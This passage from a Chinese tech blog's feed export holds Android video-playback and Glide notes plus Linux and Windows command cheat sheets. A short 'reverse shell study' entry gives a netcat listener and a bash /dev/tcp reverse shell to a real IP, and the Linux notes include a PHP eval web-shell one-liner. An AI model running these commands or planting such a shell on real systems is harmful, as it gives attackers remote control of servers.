class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.annotation.SuppressLint;<br><span class="hljs-keyword">import</span> android.net.Uri;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.MediaItem;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.SimpleExoPlayer;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.ui.PlayerView;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.util.Util;<br><span class="hljs-keyword">import</span> com.lwx.videoapplication.R;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 完成暂时推出时的继续播放</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EoActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建需要的预备内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> savedInstanceState</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> PlayerView playerView;<br>    <span class="hljs-keyword">private</span> SimpleExoPlayer player;<br>    <span class="hljs-keyword">private</span> MediaItem mediaItem;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_eo);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 获取控件</span><br><span class="hljs-comment">         */</span><br>        playerView=findViewById(R.id.video_view);<br>        <span class="hljs-comment">//创建播放器</span><br>        player=<span class="hljs-keyword">new</span> SimpleExoPlayer.Builder(<span class="hljs-keyword">this</span>).build();<br>        <span class="hljs-comment">//控件赋予播放器</span><br>        playerView.setPlayer(player);<br>        <span class="hljs-comment">//赋值源</span><br>        String url=<span class="hljs-string">&quot;http://121.196.162.32/music/我好想你.flac&quot;</span>;<br>        mediaItem=MediaItem.fromUri(Uri.parse(url));<br>        <span class="hljs-comment">//设置播放器内容</span><br>        player.setMediaItem(mediaItem);<br>    &#125;<br>    <span class="hljs-comment">//生命周期控制</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onStart</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onStart();<br>        <span class="hljs-keyword">if</span> (Util.SDK_INT &gt;= <span class="hljs-number">24</span>) &#123;<br>            initializePlayer();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResume</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onResume();<br>        hideSystemUi();<br>        <span class="hljs-keyword">if</span> ((Util.SDK_INT &lt; <span class="hljs-number">24</span> || player == <span class="hljs-keyword">null</span>)) &#123;<br>            initializePlayer();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onPause</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onPause();<br>        <span class="hljs-keyword">if</span> (Util.SDK_INT &lt; <span class="hljs-number">24</span>) &#123;<br>            releasePlayer();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onStop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onStop();<br>        <span class="hljs-keyword">if</span> (Util.SDK_INT &gt;= <span class="hljs-number">24</span>) &#123;<br>            releasePlayer();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">super</span>.onDestroy();<br><br>        <span class="hljs-keyword">if</span> (Util.SDK_INT &gt;= <span class="hljs-number">24</span>) &#123;<br>            clearPlayer();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 释放资源及存储信息</span><br><span class="hljs-comment">     * 播放/暂停状态使用getPlayWhenReady.</span><br><span class="hljs-comment">     * 当前播放位置使用getCurrentPosition.</span><br><span class="hljs-comment">     * 当前窗口索引使用getCurrentWindowIndex. 有关窗口的更多信息，请参阅 时间轴。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> playWhenReady = <span class="hljs-keyword">true</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> currentWindow = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">long</span> playbackPosition = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">releasePlayer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (player != <span class="hljs-keyword">null</span>) &#123;<br>            playWhenReady = player.getPlayWhenReady();<br>            playbackPosition = player.getCurrentPosition();<br>            currentWindow = player.getCurrentWindowIndex();<br>            player.stop();<br>            <span class="hljs-comment">//player.release();</span><br>            <span class="hljs-comment">//player = null;</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">clearPlayer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(player!=<span class="hljs-keyword">null</span>)&#123;<br>            player.release();<br>            player=<span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *     hideSystemUi是一个在 中调用的辅助方法onResume，它可以让您拥有全屏体验。</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-meta">@SuppressLint(&quot;InlinedApi&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hideSystemUi</span><span class="hljs-params">()</span> </span>&#123;<br>        playerView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE<br>                | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY<br>                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * setPlayWhenReady告诉播放器是否在获得所有播放资源后立即开始播放。因为playWhenReady是initial true，所以在应用程序第一次运行时会自动开始播放。</span><br><span class="hljs-comment">     * seekTo告诉玩家寻找特定窗口内的某个位置。双方currentWindow并playbackPosition初始化为零所以从一回放开始启动第一次应用程序运行。</span><br><span class="hljs-comment">     * prepare 告诉播放器获取播放所需的所有资源。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initializePlayer</span><span class="hljs-params">()</span> </span>&#123;<br><br>        player.setPlayWhenReady(playWhenReady);<br>        player.seekTo(currentWindow, playbackPosition);<br>        player.prepare();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio 视频 ExoPlayer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>ExoPlayer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 视频播放及横屏</title>
    <link href="/2021/05/27/AndroidStudio/%E8%A7%86%E9%A2%91/Android%20Studio%20%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%8F%8A%E6%A8%AA%E5%B1%8F/"/>
    <url>/2021/05/27/AndroidStudio/%E8%A7%86%E9%A2%91/Android%20Studio%20%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%8F%8A%E6%A8%AA%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-视频播放及横屏"><a href="#Android-Studio-视频播放及横屏" class="headerlink" title="Android Studio 视频播放及横屏"></a>Android Studio 视频播放及横屏</h1><h1 id="视频播放代码"><a href="#视频播放代码" class="headerlink" title="视频播放代码"></a>视频播放代码</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**播放 res/raw 目录下的文件</span><br><span class="hljs-comment">         * android.resource:// ：前缀固定</span><br><span class="hljs-comment">         * com.example.administrator.helloworld：为当前类的所在的包路径，可以使用 String packageName = getPackageName(); 动态获取</span><br><span class="hljs-comment">         * R.raw.la_isla：最后接 res/raw 目录中的文件名</span><br><span class="hljs-comment">         * */</span><br>        String urlv=<span class="hljs-string">&quot;http://121.196.162.32/video/2.mkv&quot;</span>;<br><span class="hljs-comment">//        video.setVideoURI(Uri.parse(&quot;android.resource://com.example.ui/&quot;+R.raw.video1));</span><br>        video.setVideoURI(Uri.parse(urlv));<br>        <span class="hljs-comment">/**视频准备完成时回调</span><br><span class="hljs-comment">         * */</span><br>        video.setOnPreparedListener(<span class="hljs-keyword">new</span> MediaPlayer.OnPreparedListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onPrepared</span><span class="hljs-params">(MediaPlayer mp)</span> </span>&#123;<br>                Log.i(<span class="hljs-string">&quot;tag&quot;</span>, <span class="hljs-string">&quot;--------------视频准备完毕,可以进行播放.......&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 视频播放完成时回调</span><br><span class="hljs-comment">         */</span><br>        video.setOnCompletionListener(<span class="hljs-keyword">new</span> MediaPlayer.OnCompletionListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCompletion</span><span class="hljs-params">(MediaPlayer mp)</span> </span>&#123;<br>                Log.i(<span class="hljs-string">&quot;tag&quot;</span>, <span class="hljs-string">&quot;------------------视频播放完毕..........&quot;</span>);<br>                <span class="hljs-comment">/**播放完成时，再次循环播放*/</span><br>                video.start();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 视频播放发送错误时回调</span><br><span class="hljs-comment">         */</span><br>        video.setOnErrorListener(<span class="hljs-keyword">new</span> MediaPlayer.OnErrorListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onError</span><span class="hljs-params">(MediaPlayer mp, <span class="hljs-keyword">int</span> what, <span class="hljs-keyword">int</span> extra)</span> </span>&#123;<br>                Log.i(<span class="hljs-string">&quot;tag&quot;</span>, <span class="hljs-string">&quot;---------------------视频播放失败...........&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">/**开始播放视频</span><br><span class="hljs-comment">         * */</span><br>        video.start();<br></code></pre></div></td></tr></table></figure><h1 id="横屏"><a href="#横屏" class="headerlink" title="横屏"></a>横屏</h1><h3 id="方法一：在AndroidManifest-xml中配置"><a href="#方法一：在AndroidManifest-xml中配置" class="headerlink" title="方法一：在AndroidManifest.xml中配置"></a>方法一：在AndroidManifest.xml中配置</h3><p>假设不想让软件在横竖屏之间切换，最简单的办法就是在项目的AndroidManifest.xml中找到你所指定的activity中加上android:screenOrientation属性。他有下面几个參数：</p><p>“unspecified”:默认值 由系统来推断显示方向.判定的策略是和设备相关的，所以不同的设备会有不同的显示方向.<br> “landscape”:横屏显示（宽比高要长）<br> “portrait”:竖屏显示(高比宽要长)<br> “user”:用户当前首选的方向<br> “behind”:和该Activity以下的那个Activity的方向一致(在Activity堆栈中的)<br> “sensor”:有物理的感应器来决定。假设用户旋转设备这屏幕会横竖屏切换。<br> “nosensor”:忽略物理感应器。这样就不会随着用户旋转设备而更改了（”unspecified”设置除外）。</p><h3 id="方法二：在java代码中设置"><a href="#方法二：在java代码中设置" class="headerlink" title="方法二：在java代码中设置"></a>方法二：在java代码中设置</h3><p>设置横屏代码：setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);//横屏</p><p>设置竖屏代码：setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);//竖屏</p><p>由于横屏有两个方向的横法，而这个设置横屏的语句，假设不是默认的横屏方向，会把已经横屏的屏幕旋转180°。</p><p>所以能够先推断是否已经为横屏了。假设不是再旋转，不会让用户认为转的莫名其妙啦！代码例如以下：<br> if(this.getResources().getConfiguration().orientation ==Configuration.ORIENTATION_PORTRAIT){<br> setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);<br> }</p>]]></content>
    
    
    <categories>
      
      <category>Android Studio 视频</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹Shell学习</title>
    <link href="/2021/05/27/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9Shell%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/27/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9Shell%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="反弹Shell学习"><a href="#反弹Shell学习" class="headerlink" title="反弹Shell学习"></a>反弹Shell学习</h1><h1 id="具体实验"><a href="#具体实验" class="headerlink" title="具体实验"></a>具体实验</h1><p>1.本机监听端口</p><blockquote><p>nc -lvp 6789</p></blockquote><p>2.目标机的</p><blockquote><p>bash -i &gt;&amp; /dev/tcp/121.196.162.32/6789 0&gt;&amp;1</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>信安 渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常用命令</title>
    <link href="/2021/05/21/Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/05/21/Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><p><a href="https://www.runoob.com/linux/linux-comm-find.html">参考</a>命令</p><p>按照名称查找当前目录下</p><p><code>find . -name &quot;test&quot;</code></p><p>按照文件类型查找当前目录下</p><p><code>find . -type f</code></p><h1 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h1><p><code>passwd 用户名</code></p><h1 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h1><ol><li><p>mkdir 创建目录</p></li><li><p>rm 删除文件目录</p><p>-f 不询问</p><p>-r 递归删除</p></li><li><p>mv 操作目录 </p><ol><li>重命名(第一个为原名，第二个为新名)</li><li>剪切(第一个为目录名称，第二个新位置)</li></ol></li><li><p>cp -r 拷贝目录</p></li><li><p>touch 创建文件</p></li><li><p>chmod 改变权限</p></li></ol><h1 id="压缩解压"><a href="#压缩解压" class="headerlink" title="压缩解压"></a>压缩解压</h1><ol><li><p>压缩：</p><ol><li><p>tar -zcvf 新名称 压缩目录</p><p>z：调用gzip压缩命令进行压缩<br>c：打包文件<br>v：显示运行过程<br>f：指定文件名</p></li></ol></li><li><p>解压</p><ol><li>tar -zxvf 文件(x表示解压)</li><li>unzip 文件</li></ol></li></ol><h1 id="echo将-lt-gt-写入文件"><a href="#echo将-lt-gt-写入文件" class="headerlink" title="echo将&lt;&gt;写入文件"></a>echo将&lt;&gt;写入文件</h1><p>使用单引号包含启用转义字符</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);?&gt;&#x27;</span> &gt; 1.php<br></code></pre></div></td></tr></table></figure><h1 id="存储空间查看"><a href="#存储空间查看" class="headerlink" title="存储空间查看"></a>存储空间查看</h1><ol><li>free</li><li>df</li><li>du</li></ol><h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">apt-get update # 从服务器获取全部可用的、最新的软件包列表，并缓存到本地电脑<br>apt-get upgrade # 会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新<br>apt-get full-upgrade # 根据列表信息，对需要升级的软件包进行完整安装。也就是先删除软件，然后完整地重新安装整个软件<br>apt-get dist-upgrade # 可能会为了解决软件包冲突而删除一些已安装的软件包，也可能会为了解决软件包依赖问题安装新的软件包<br>apt list --upgradable # 根据列表对比信息，看看有哪些可更新的软件，如果没有则显示为空<br>apt-get autoremove # 更新完成之后会有一些不需要的旧组件需要清除。此时使用apt autoremove即可完成清理<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows常用命令</title>
    <link href="/2021/05/21/Windows/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/05/21/Windows/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="获取hash值"><a href="#获取hash值" class="headerlink" title="获取hash值"></a>获取hash值</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">certutil -hashfile [filePath] MD5<br>certutil -hashfile [filePath] SHA1<br>certutil -hashfile [filePath] SHA256<br></code></pre></div></td></tr></table></figure><h1 id="获取当前路径"><a href="#获取当前路径" class="headerlink" title="获取当前路径"></a>获取当前路径</h1><p>chdir获取当前路径</p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看具体端口占用情况</span><br>netstat -ano|findstr <span class="hljs-string">&quot;8080&quot;</span><br><span class="hljs-comment"># 根据pid查看具体进程</span><br>tasklist|findstr <span class="hljs-string">&quot;2534&quot;</span><br><span class="hljs-comment"># 根据pid或名称关闭进程</span><br>taskkill /f /pid (pid)<br>taskkill /f /im (名称)<br></code></pre></div></td></tr></table></figure><h1 id="文件常用操作"><a href="#文件常用操作" class="headerlink" title="文件常用操作"></a>文件常用操作</h1><p>/?获取帮助</p><ol><li>dir查看目录文件</li><li>mkdir创建目录</li><li>copy 复制文件 <code>copy nul a.txt</code>创建空白文件</li><li>del 删除文件</li><li>rd 删除文件夹</li><li>ren 复制文件</li><li>type 显示文本信息 <code>type nul&gt;a.txt</code>创建空白文件</li><li>more 分段查看文件内容，<code>more +100 abc.txt</code>，从第100行开始查看abc.txt文件内容</li><li>cls 清屏</li></ol><h1 id="获取权限信息"><a href="#获取权限信息" class="headerlink" title="获取权限信息"></a>获取权限信息</h1><p>whoami查看本机信息</p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 多种点击事件</title>
    <link href="/2021/05/20/AndroidStudio/Android%20Studio%20%E5%A4%9A%E7%A7%8D%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/"/>
    <url>/2021/05/20/AndroidStudio/Android%20Studio%20%E5%A4%9A%E7%A7%8D%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-多种点击事件"><a href="#Android-Studio-多种点击事件" class="headerlink" title="Android Studio 多种点击事件"></a>Android Studio 多种点击事件</h1><p>普通事件的长按</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">change.setOnLongClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//具体流程</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>        &#125;);<br></code></pre></div></td></tr></table></figure><p>运行后发现当长按之后长按的事件和点击的事件都执行了</p><p>当itemLongClickListener返回false时就会触发list view的点击事件，所以吧返回的false改为true即可</p><p>return true；</p><p>ListView的长按事件</p><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * listView的长按事件</span><br><span class="hljs-comment"> */</span><br>listView.setOnItemLongClickListener(<span class="hljs-keyword">new</span> AdapterView.OnItemLongClickListener() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">onItemLongClick</span><span class="hljs-params">(AdapterView&lt;?&gt; parent, View view, <span class="hljs-keyword">int</span> position, <span class="hljs-keyword">long</span> id)</span> </span>&#123;<br>        Toast.makeText(DActivity.<span class="hljs-keyword">this</span>,id+<span class="hljs-string">&quot;长按事件&quot;</span>,Toast.LENGTH_SHORT).show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio Glide</title>
    <link href="/2021/05/20/AndroidStudio/Android%20Studio%20Glide/"/>
    <url>/2021/05/20/AndroidStudio/Android%20Studio%20Glide/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-Glide"><a href="#Android-Studio-Glide" class="headerlink" title="Android Studio Glide"></a>Android Studio Glide</h1><h1 id="导入具体包"><a href="#导入具体包" class="headerlink" title="导入具体包"></a>导入具体包</h1><p>build.gradle</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">implementation</span> &#x27;com.github.bumptech.glide:glide:<span class="hljs-number">3</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span>&#x27;<br></code></pre></div></td></tr></table></figure><p>具体使用</p><p>简易加载图片</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//第一个为具体的Acticity界面，第二个为任意位置的图片资源，第三个位具体的控件</span><br>Glide.with(MainActivity.<span class="hljs-keyword">this</span>).load(imgsrc).into(imgview);<br></code></pre></div></td></tr></table></figure><p>设置背景</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//old</span><br>Glide.with(MainActivity.<span class="hljs-keyword">this</span>)<br>    .load(imgsrc)<br>    .asBitmap()<br>    .into(<span class="hljs-keyword">new</span> SimpleTarget&lt;Bitmap&gt;(<span class="hljs-number">1080</span>,<span class="hljs-number">2340</span>) &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onResourceReady</span><span class="hljs-params">(Bitmap resource, GlideAnimation&lt;? <span class="hljs-keyword">super</span> Bitmap&gt; glideAnimation)</span> </span>&#123;<br>            Drawable drawable = <span class="hljs-keyword">new</span> BitmapDrawable(resource);<br>            <span class="hljs-keyword">if</span> 